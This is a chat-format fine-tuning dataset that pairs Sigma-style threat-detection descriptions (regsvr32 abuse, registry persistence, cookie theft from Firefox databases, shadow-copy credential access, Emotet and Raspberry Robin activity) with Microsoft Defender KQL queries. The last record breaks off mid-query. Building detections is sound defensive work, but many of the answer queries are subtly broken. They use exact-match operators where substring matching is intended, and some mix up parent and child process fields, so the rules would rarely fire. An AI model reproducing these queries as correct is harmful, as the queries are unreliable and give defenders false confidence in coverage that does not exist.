{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of regsvr32 where the DLL is located in a highly suspicious locations Topic: proc_creation_win_regsvr32_susp_exec_path_2"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\regsvr32.exe\" or ProcessVersionInfoOriginalFileName =~ \"REGSVR32.EXE\") and ((ProcessCommandLine in~ (\":\\\\PerfLogs\\\\\", \":\\\\Temp\\\\\", \"\\\\Windows\\\\Registration\\\\CRMLog\", \"\\\\Windows\\\\System32\\\\com\\\\dmp\\\\\", \"\\\\Windows\\\\System32\\\\FxsTmp\\\\\", \"\\\\Windows\\\\System32\\\\Microsoft\\\\Crypto\\\\RSA\\\\MachineKeys\\\\\", \"\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\\", \"\\\\Windows\\\\System32\\\\spool\\\\PRINTERS\\\\\", \"\\\\Windows\\\\System32\\\\spool\\\\SERVERS\\\\\", \"\\\\Windows\\\\System32\\\\Tasks_Migrated\\\\\", \"\\\\Windows\\\\System32\\\\Tasks\\\\Microsoft\\\\Windows\\\\SyncCenter\\\\\", \"\\\\Windows\\\\SysWOW64\\\\com\\\\dmp\\\\\", \"\\\\Windows\\\\SysWOW64\\\\FxsTmp\\\\\", \"\\\\Windows\\\\SysWOW64\\\\Tasks\\\\Microsoft\\\\Windows\\\\PLA\\\\System\\\\\", \"\\\\Windows\\\\SysWOW64\\\\Tasks\\\\Microsoft\\\\Windows\\\\SyncCenter\\\\\", \"\\\\Windows\\\\Tasks\\\\\", \"\\\\Windows\\\\Tracing\\\\\")) or ((ProcessCommandLine in~ (\" \\\"C:\\\\\", \" C:\\\\\", \" 'C:\\\\\", \"D:\\\\\")) and (not((ProcessCommandLine in~ (\"C:\\\\Program Files (x86)\\\\\", \"C:\\\\Program Files\\\\\", \"C:\\\\ProgramData\\\\\", \"C:\\\\Users\\\\\", \" C:\\\\Windows\\\\\", \" \\\"C:\\\\Windows\\\\\", \" 'C:\\\\Windows\\\\\")))))) and (not((ProcessCommandLine =~ \"\" or isnull(ProcessCommandLine))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Topic: proc_creation_win_powershell_import_cert_susp_locations"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\\\\AppData\\\\Local\\\\Temp\\\\\", \":\\\\Windows\\\\TEMP\\\\\", \"\\\\Desktop\\\\\", \"\\\\Downloads\\\\\", \"\\\\Perflogs\\\\\", \":\\\\Users\\\\Public\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a \".CPL\" file located in the user temp directory via the Shell32 DLL \"Control_RunDLL\" export function.\nThis behavior was observed in multiple Raspberry-Robin variants.\n Topic: proc_creation_win_malware_raspberry_robin_rundll32_shell32_cpl_exection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"shell32.dll\", \"Control_RunDLL\", \".CPL\")) and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\") and (InitiatingProcessFileName in~ (\"\\\\rundll32.exe\", \"\\\\control.exe\")) and ProcessCommandLine =~ \"\\\\AppData\\\\Local\\\\Temp\\\\\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects calls to base64 encoded WMI class such as \"Win32_ShadowCopy\", \"Win32_ScheduledJob\", etc. Topic: proc_creation_win_powershell_base64_wmi_classes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\"))) and ((ProcessCommandLine in~ (\"VwBpAG4AMwAyAF8ATABvAGcAZwBlAGQATwBuAFUAcwBlAHIA\", \"cAaQBuADMAMgBfAEwAbwBnAGcAZQBkAE8AbgBVAHMAZQByA\", \"XAGkAbgAzADIAXwBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcg\", \"V2luMzJfTG9nZ2VkT25Vc2Vy\", \"dpbjMyX0xvZ2dlZE9uVXNlc\", \"XaW4zMl9Mb2dnZWRPblVzZX\")) or (ProcessCommandLine in~ (\"VwBpAG4AMwAyAF8AUAByAG8AYwBlAHMAcw\", \"cAaQBuADMAMgBfAFAAcgBvAGMAZQBzAHMA\", \"XAGkAbgAzADIAXwBQAHIAbwBjAGUAcwBzA\", \"V2luMzJfUHJvY2Vzc\", \"dpbjMyX1Byb2Nlc3\", \"XaW4zMl9Qcm9jZXNz\")) or (ProcessCommandLine in~ (\"VwBpAG4AMwAyAF8AUwBjAGgAZQBkAHUAbABlAGQASgBvAGIA\", \"cAaQBuADMAMgBfAFMAYwBoAGUAZAB1AGwAZQBkAEoAbwBiA\", \"XAGkAbgAzADIAXwBTAGMAaABlAGQAdQBsAGUAZABKAG8AYg\", \"V2luMzJfU2NoZWR1bGVkSm9i\", \"dpbjMyX1NjaGVkdWxlZEpvY\", \"XaW4zMl9TY2hlZHVsZWRKb2\")) or (ProcessCommandLine in~ (\"VwBpAG4AMwAyAF8AUwBoAGEAZABvAHcAYwBvAHAAeQ\", \"cAaQBuADMAMgBfAFMAaABhAGQAbwB3AGMAbwBwAHkA\", \"XAGkAbgAzADIAXwBTAGgAYQBkAG8AdwBjAG8AcAB5A\", \"V2luMzJfU2hhZG93Y29we\", \"dpbjMyX1NoYWRvd2NvcH\", \"XaW4zMl9TaGFkb3djb3B5\")) or (ProcessCommandLine in~ (\"VwBpAG4AMwAyAF8AVQBzAGUAcgBBAGMAYwBvAHUAbgB0A\", \"cAaQBuADMAMgBfAFUAcwBlAHIAQQBjAGMAbwB1AG4AdA\", \"XAGkAbgAzADIAXwBVAHMAZQByAEEAYwBjAG8AdQBuAHQA\", \"V2luMzJfVXNlckFjY291bn\", \"dpbjMyX1VzZXJBY2NvdW50\", \"XaW4zMl9Vc2VyQWNjb3Vud\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a renamed \"NirCmd.exe\" binary based on the PE metadata fields. Topic: proc_creation_win_renamed_nircmd"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoOriginalFileName =~ \"NirCmd.exe\" and (not((InitiatingProcessFolderPath in~ (\"\\\\nircmd.exe\", \"\\\\nircmdc.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects enabling of the \"AllowAnonymousCallback\" registry value, which allows a remote connection between computers that do not have a trust relationship. Topic: registry_set_enable_anonymous_connection"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Microsoft\\\\WBEM\\\\CIMOM\\\\AllowAnonymousCallback\" and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a possible persistence mechanism using RUN key for Windows Explorer and pointing to a suspicious folder Topic: registry_set_susp_reg_persist_explorer_run"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run\" and (RegistryValueData contains \":\\\\$Recycle.bin\\\\\" or RegistryValueData contains \":\\\\ProgramData\\\\\" or RegistryValueData contains \":\\\\Temp\\\\\" or RegistryValueData contains \":\\\\Users\\\\Default\\\\\" or RegistryValueData contains \":\\\\Users\\\\Public\\\\\" or RegistryValueData contains \":\\\\Windows\\\\Temp\\\\\" or RegistryValueData contains \"\\\\AppData\\\\Local\\\\Temp\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of the Process Explorer drivers by processes other than Process Explorer (procexp) itself.\nHack tools or malware may use the Process Explorer driver to elevate privileges, drops it to disk for a few moments, runs a service using that driver and removes it afterwards.\n Topic: file_event_win_sysinternals_procexp_driver_susp_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".sys\" and (not((InitiatingProcessFolderPath in~ (\"\\\\procexp.exe\", \"\\\\procexp64.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of \"sw_vers\" for system information discovery Topic: proc_creation_macos_swvers_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"/sw_vers\" and (ProcessCommandLine in~ (\"-buildVersion\", \"-productName\", \"-productVersion\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential in-memory downloading and compiling of applets using curl and osacompile as seen used by XCSSET malware Topic: proc_creation_macos_susp_in_memory_download_and_compile"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"osacompile\", \"curl\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the \"Set-Service\" powershell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in powershell 7) Topic: proc_creation_win_powershell_hide_services_via_set_service"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-SecurityDescriptorSddl \", \"-sd \")) and (FolderPath endswith \"\\\\pwsh.exe\" or ProcessVersionInfoOriginalFileName =~ \"pwsh.dll\") and (ProcessCommandLine in~ (\"Set-Service \", \"DCLCWPDTSD\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level. This is pretty indicative of malicious actions. Topic: proc_creation_win_rar_compression_with_password"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" -hp\" and (ProcessCommandLine in~ (\" -m\", \" a \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects tampering with autologger trace sessions which is a technique used by attackers to disable logging Topic: registry_set_disable_autologger_sessions"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\System\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger*\" and ((RegistryKey contains \"\\\\EventLog-\" or RegistryKey contains \"\\\\Defender\") and (RegistryKey endswith \"\\\\Enable\" or RegistryKey endswith \"\\\\Start\") and RegistryValueData =~ \"DWORD (0x00000000)\")) and (not(InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\system32\\\\wevtutil.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect usage of the \"sqlite\" binary to query databases in Firefox and other Gecko-based browsers for potential data stealing. Topic: proc_creation_win_sqlite_firefox_gecko_profile_data"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"cookies.sqlite\", \"places.sqlite\")) and (ProcessVersionInfoProductName =~ \"SQLite\" or (FolderPath endswith \"\\\\sqlite.exe\" or FolderPath endswith \"\\\\sqlite3.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects \"svchost.exe\" spawning \"rundll32.exe\" with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie. This could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server) or potentially a sign of exploitation of CVE-2023-23397\n Topic: proc_creation_win_rundll32_webdav_client_susp_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine matches regex \"://\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\" and InitiatingProcessCommandLine =~ \"-s WebClient\" and InitiatingProcessFileName =~ \"\\\\svchost.exe\" and ProcessCommandLine =~ \"C:\\\\windows\\\\system32\\\\davclnt.dll,DavSetCookie\" and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\") and (not((ProcessCommandLine in~ (\"://10.\", \"://192.168.\", \"://172.16.\", \"://172.17.\", \"://172.18.\", \"://172.19.\", \"://172.20.\", \"://172.21.\", \"://172.22.\", \"://172.23.\", \"://172.24.\", \"://172.25.\", \"://172.26.\", \"://172.27.\", \"://172.28.\", \"://172.29.\", \"://172.30.\", \"://172.31.\", \"://127.\", \"://169.254.\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a file named \"WerFault.exe\" or \"wer.dll\" in an uncommon folder, which could be a sign of WerFault DLL hijacking. Topic: file_event_win_werfault_dll_hijacking"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"\\\\WerFault.exe\", \"\\\\wer.dll\")) and (not((FileName in~ (\"C:\\\\Windows\\\\SoftwareDistribution\\\\\", \"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\", \"C:\\\\Windows\\\\WinSxS\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Enable Dynamic Data Exchange protocol (DDE) in all supported editions of Microsoft Word or Excel. Topic: registry_set_office_enable_dde"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\Word\\\\Security\\\\AllowDDE\" and (RegistryValueData in~ (\"DWORD (0x00000001)\", \"DWORD (0x00000002)\"))) or ((RegistryKey endswith \"\\\\Excel\\\\Security\\\\DisableDDEServerLaunch\" or RegistryKey endswith \"\\\\Excel\\\\Security\\\\DisableDDEServerLookup\") and RegistryValueData =~ \"DWORD (0x00000000)\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"libvlc.dll\", a DLL that is legitimately used by \"VLC.exe\" Topic: image_load_side_load_libvlc"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\libvlc.dll\" and (not((FolderPath startswith \"C:\\\\Program Files (x86)\\\\VideoLAN\\\\VLC\\\\\" or FolderPath startswith \"C:\\\\Program Files\\\\VideoLAN\\\\VLC\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the binary \"wpbbin\" which is used as part of the UEFI based persistence method described in the reference section Topic: proc_creation_win_wpbbin_potential_persistence"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath =~ \"C:\\\\Windows\\\\System32\\\\wpbbin.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks Topic: proc_creation_win_gup_suspicious_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\GUP.exe\" and (not(((InitiatingProcessFolderPath in~ (\"\\\\Program Files\\\\Notepad++\\\\updater\\\\GUP.exe\", \"\\\\Program Files (x86)\\\\Notepad++\\\\updater\\\\GUP.exe\")) or (FolderPath contains \"\\\\Users\\\\\" and (InitiatingProcessFolderPath in~ (\"\\\\AppData\\\\Local\\\\Notepad++\\\\updater\\\\GUP.exe\", \"\\\\AppData\\\\Roaming\\\\Notepad++\\\\updater\\\\GUP.exe\"))))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the desktopimgdownldr utility being used to download a remote file. An adversary may use desktopimgdownldr to download arbitrary files as an alternative to certutil. Topic: proc_creation_win_desktopimgdownldr_remote_file_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\desktopimgdownldr.exe\" and ProcessCommandLine =~ \"/lockscreenurl:http\" and InitiatingProcessFolderPath =~ \"\\\\desktopimgdownldr.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects files written by the different tools that exploit HiveNightmare Topic: file_event_win_hktl_hivenightmare_file_exports"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FolderPath contains \"\\\\hive_sam_\" or FolderPath contains \"\\\\SAM-2021-\" or FolderPath contains \"\\\\SAM-2022-\" or FolderPath contains \"\\\\SAM-2023-\" or FolderPath contains \"\\\\SAM-haxx\" or FolderPath contains \"\\\\Sam.save\") or FolderPath =~ \"C:\\\\windows\\\\temp\\\\sam\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects binaries used by the Lazarus group which use system names but are executed and launched from non-default location Topic: proc_creation_win_apt_lazarus_binary_masquerading"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath in~ (\"\\\\msdtc.exe\", \"\\\\gpsvc.exe\")) and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when the Console Window Host (conhost.exe) process is spawned by an uncommon parent process, which could be indicative of potential code injection activity. Topic: proc_creation_win_conhost_uncommon_parent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"\\\\explorer.exe\", \"\\\\lsass.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\services.exe\", \"\\\\smss.exe\", \"\\\\spoolsv.exe\", \"\\\\svchost.exe\", \"\\\\userinit.exe\", \"\\\\wininit.exe\", \"\\\\winlogon.exe\")) and InitiatingProcessFolderPath =~ \"\\\\conhost.exe\") and (not((InitiatingProcessCommandLine in~ (\"-k apphost -s AppHostSvc\", \"-k imgsvc\", \"-k localService -p -s RemoteRegistry\", \"-k LocalSystemNetworkRestricted -p -s NgcSvc\", \"-k NetSvcs -p -s NcaSvc\", \"-k netsvcs -p -s NetSetupSvc\", \"-k netsvcs -p -s wlidsvc\", \"-k NetworkService -p -s DoSvc\", \"-k wsappx -p -s AppXSvc\", \"-k wsappx -p -s ClipSVC\")))) and (not((InitiatingProcessCommandLine in~ (\"C:\\\\Program Files (x86)\\\\Dropbox\\\\Client\\\\\", \"C:\\\\Program Files\\\\Dropbox\\\\Client\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Shadow Copies creation using operating systems utilities, possible credential access Topic: proc_creation_win_susp_shadow_copies_creation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"shadow\", \"create\")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\wmic.exe\" or FolderPath endswith \"\\\\vssadmin.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\", \"wmic.exe\", \"VSSADMIN.EXE\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious powershell execution via a schedule task where the command ends with an suspicious flags to hide the powershell instance instead of executeing scripts or commands. This could be a sign of persistence via PowerShell \"Get-Variable\" technique as seen being used in Colibri Loader Topic: proc_creation_win_schtasks_powershell_persistence"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \" -windowstyle hidden\" or ProcessCommandLine endswith \" -w hidden\" or ProcessCommandLine endswith \" -ep bypass\" or ProcessCommandLine endswith \" -noni\") and (InitiatingProcessCommandLine in~ (\"-k netsvcs\", \"-s Schedule\")) and InitiatingProcessFileName =~ \"C:\\\\WINDOWS\\\\System32\\\\svchost.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker adds a new \"DLLPathOverride\" value to the \"Natural Language\" key in order to achieve persistence which will get invoked by \"SearchIndexer.exe\" process Topic: registry_set_persistence_natural_language"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\ContentIndex\\\\Language*\" and (RegistryKey contains \"\\\\StemmerDLLPathOverride\" or RegistryKey contains \"\\\\WBDLLPathOverride\" or RegistryKey contains \"\\\\StemmerClass\" or RegistryKey contains \"\\\\WBreakerClass\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the enumeration of other remote systems. Topic: proc_creation_macos_remote_system_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"-a\" and InitiatingProcessFolderPath =~ \"/arp\") or ((ProcessCommandLine in~ (\" 10.\", \" 192.168.\", \" 172.16.\", \" 172.17.\", \" 172.18.\", \" 172.19.\", \" 172.20.\", \" 172.21.\", \" 172.22.\", \" 172.23.\", \" 172.24.\", \" 172.25.\", \" 172.26.\", \" 172.27.\", \" 172.28.\", \" 172.29.\", \" 172.30.\", \" 172.31.\", \" 127.\", \" 169.254.\")) and InitiatingProcessFolderPath =~ \"/ping\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects commandline containing reference to files ending with a \".\" This scheme has been seen used by raspberry-robin Topic: proc_creation_win_malware_raspberry_robin_single_dot_ending_file"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine matches regex \"\\\\\\\\[a-zA-Z0-9]{1,32}\\\\.[a-zA-Z0-9]{1,6}\\\\.[ \"']{1}\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of AppleScript of the macOS scripting language AppleScript. Topic: proc_creation_macos_applescript"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -e \", \".scpt\", \".js\")) and InitiatingProcessFolderPath =~ \"/osascript\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"del\" builtin command to remove files using greedy/wildcard expression. This is often used by malware to delete content of folders that perhaps contains the initial malware infection or to delete evidence. Topic: proc_creation_win_cmd_del_greedy_deletion"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"del \", \"erase \")) and (ProcessCommandLine in~ (\"\\\\*.au3\", \"\\\\*.dll\", \"\\\\*.exe\", \"\\\\*.js\")) and (FolderPath endswith \"\\\\cmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "This rule detects execution of PowerShell scripts located in the \"C:\\Users\\Public\" folder Topic: proc_creation_win_powershell_public_folder"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-f C:\\\\Users\\\\Public\", \"-f \\\"C:\\\\Users\\\\Public\", \"-f %Public%\", \"-fi C:\\\\Users\\\\Public\", \"-fi \\\"C:\\\\Users\\\\Public\", \"-fi %Public%\", \"-fil C:\\\\Users\\\\Public\", \"-fil \\\"C:\\\\Users\\\\Public\", \"-fil %Public%\", \"-file C:\\\\Users\\\\Public\", \"-file \\\"C:\\\\Users\\\\Public\", \"-file %Public%\")) and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the Emotet Epoch4 loader as reported by @malware_traffic back in 2022.\nThe \".lnk\" file was delivered via phishing campaign.\n Topic: proc_creation_win_malware_emotet_loader_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\cmd.exe\", \"\\\\explorer.exe\", \"\\\\powershell.exe\")) and (ProcessCommandLine in~ (\"findstr\", \".vbs\", \".lnk\")) and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\powershell.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious child processes of \"provlaunch.exe\" which might indicate potential abuse to proxy execution. Topic: proc_creation_win_provlaunch_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\calc.exe\" or FolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\cscript.exe\" or FolderPath endswith \"\\\\mshta.exe\" or FolderPath endswith \"\\\\notepad.exe\" or FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\regsvr32.exe\" or FolderPath endswith \"\\\\rundll32.exe\" or FolderPath endswith \"\\\\wscript.exe\") or (FolderPath contains \":\\\\PerfLogs\\\\\" or FolderPath contains \":\\\\Temp\\\\\" or FolderPath contains \":\\\\Users\\\\Public\\\\\" or FolderPath contains \"\\\\AppData\\\\Temp\\\\\" or FolderPath contains \"\\\\Windows\\\\System32\\\\Tasks\\\\\" or FolderPath contains \"\\\\Windows\\\\Tasks\\\\\" or FolderPath contains \"\\\\Windows\\\\Temp\\\\\")) and InitiatingProcessFileName =~ \"\\\\provlaunch.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the Notepad++ updater (gup) to launch other commands or executables Topic: proc_creation_win_gup_arbitrary_binary_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\gup.exe\" and InitiatingProcessFolderPath =~ \"\\\\explorer.exe\") and (not(((ProcessCommandLine =~ \"\\\\Notepad++\\\\notepad++.exe\" and InitiatingProcessFolderPath =~ \"\\\\explorer.exe\") or isnull(ProcessCommandLine) or InitiatingProcessFileName =~ \"\\\\Notepad++\\\\updater\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects command lines that indicate unwanted modifications to registry keys that disable important Internet Explorer security features Topic: proc_creation_win_powershell_disable_ie_features"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -name IEHarden \", \" -value 0 \")) or (ProcessCommandLine in~ (\" -name DEPOff \", \" -value 1 \")) or (ProcessCommandLine in~ (\" -name DisableFirstRunCustomize \", \" -value 2 \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a renamed \"PingCastle\" binary based on the PE metadata fields. Topic: proc_creation_win_renamed_pingcastle"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessVersionInfoOriginalFileName in~ (\"PingCastleReporting.exe\", \"PingCastleCloud.exe\", \"PingCastle.exe\")) or (ProcessCommandLine contains \"--scanner aclcheck\" or ProcessCommandLine contains \"--scanner antivirus\" or ProcessCommandLine contains \"--scanner computerversion\" or ProcessCommandLine contains \"--scanner foreignusers\" or ProcessCommandLine contains \"--scanner laps_bitlocker\" or ProcessCommandLine contains \"--scanner localadmin\" or ProcessCommandLine contains \"--scanner nullsession\" or ProcessCommandLine contains \"--scanner nullsession-trust\" or ProcessCommandLine contains \"--scanner oxidbindings\" or ProcessCommandLine contains \"--scanner remote\" or ProcessCommandLine contains \"--scanner share\" or ProcessCommandLine contains \"--scanner smb\" or ProcessCommandLine contains \"--scanner smb3querynetwork\" or ProcessCommandLine contains \"--scanner spooler\" or ProcessCommandLine contains \"--scanner startup\" or ProcessCommandLine contains \"--scanner zerologon\") or ProcessCommandLine contains \"--no-enum-limit\" or (ProcessCommandLine contains \"--healthcheck\" and ProcessCommandLine contains \"--level Full\") or (ProcessCommandLine contains 